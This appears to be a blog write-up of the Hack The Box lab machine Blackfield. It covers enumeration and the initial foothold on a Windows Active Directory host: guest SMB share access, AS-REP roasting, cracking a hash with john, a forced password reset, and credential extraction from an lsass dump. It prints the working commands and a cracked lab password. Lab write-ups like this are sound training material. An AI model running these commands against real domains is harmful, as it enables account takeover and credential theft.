---
title: "Writeup: Blackfield from Hack The Box"
author: Asier Núñez
pubDatetime: 2025-01-08T19:51:29.606Z
slug: blackfield-writeup
featured: false
draft: false
tags:
  - Windows
  - Active Directory
  - Security
  - Ethical Hacking
description: "Writeup for the Blackfield machine from Hack The Box, a Windows Active Directory"
---

# Enumeration

After the initial scan with `nmap`, we can see that the machine is a Widows Active Directory part of the `blackfield.local` domain.

![Port-Scan](@assets/images/writeups/htb/blackfield/port-scan.png)

| Port | Service      | Version                                 |
| ---- | ------------ | --------------------------------------- |
| 53   | dns          | Microsoft DNS                           |
| 88   | kerberos-sec | Microsoft Windows Kerberos              |
| 135  | msrpc        | Microsoft Windows RPC                   |
| 389  | ldap         | Microsoft Windows Active Directory LDAP |
| 445  | microsoft-ds | Microsoft Windows SMB                   |
| 593  | ncacn_http   | Microsoft Windows RPC over HTTP         |
| 3268 | ldap         | Microsoft Windows Active Directory LDAP |
| 5985 | WinRM        | Microsoft Windows Remote Management     |

The WinRM could be useful once we have credentials to access the machine.
As for the rest of the services, we can see that we have the usual services for a Windows Active Directory.

# Initial Foothold

If we try to enumerate shares with a null session, we'll get an unauthorized error. So let's try to enumerate shares with the `guest` user.

```bash
smbmap -u 'guest' -H 10.129.93.184 --no-pass
```

![SMBMap](@assets/images/writeups/htb/blackfield/smbmap.png)

We can see that we have READ permissions on the `profiles$` share. If we try to access it, we'll see folders for different users.

```bash
smbclient \\\\10.129.93.184\\profiles$ -U guest
```

![SMBClient](@assets/images/writeups/htb/blackfield/smbclient.png)

We can save the users into a file and try to perform a kerberos attack.

```bash
smbclient \\\\10.129.93.184\\profiles$ -U guest -c ls | awk  '{print $1}' > users.txt
```

With these 314 users, we can try to perform an `AS-REP Roasting` attack with `GetUserSPNs.py`.

```bash
impacket-GetNPUsers -usersfile users.txt blackfield.local/ -dc-ip 10.129.93.184 -no-pass | grep -v "KDC_ERR_C_PRINCIPAL_UNKNOWN"
```

![NPUsers](@assets/images/writeups/htb/blackfield/npusers.png)

Now can try to crack the hash with `john`.

```bash
john hash --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt
```

![John](@assets/images/writeups/htb/blackfield/john.png)

```
support:#00^BlackKnight
```

Now we can use bloodhound to enumerate the domain.

```bash
bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.129.93.184 -c all
```

Once we have the results, we can see that the `support` user has permissions to change the password of the `audit2020` user.

![BH-ForceChangePass](@assets/images/writeups/htb/blackfield/bh-forcechangepass.png)

We can now try to change the password of the `audit2020` user.

```bash
net rpc password AUDIT2020 'password123!@#' -U blackfield.local/support%#00^BlackKnight -S 10.129.93.184
```

![Net-RPC](@assets/images/writeups/htb/blackfield/net-rpc.png)

Let's verify that the password has been changed.

```bash
crackmapexec smb 10.129.93.184 -u audit2020 -p 'password123!@#'
```

![CME-Pass-Val](@assets/images/writeups/htb/blackfield/cme-pass-val.png)

If we chek for the shares, we can see that the `audit2020` user has access to the `forensic` share.

```bash
crackmapexec smb 10.129.93.184 -u audit2020 -p 'password123!@#' --shares
```

![CME-Audit-Shares](@assets/images/writeups/htb/blackfield/cme-audit-shares.png)

![SMBClient-Audit](@assets/images/writeups/htb/blackfield/smbclient-audit.png)

If we take a look at the files in the `forensic` share, we can see an lsass dump.

![LSASS-Dump](@assets/images/writeups/htb/blackfield/lsass-dmp.png)

Now with the help of `pypykatz`, we can extract the hashes from the dump.

```bash
pypykatz lsa minidump lsass.DMP
```

From this dump, we obtain the following hashes:

![WinRM](@assets/images/writeups/htb/blackfield/winrm.png)
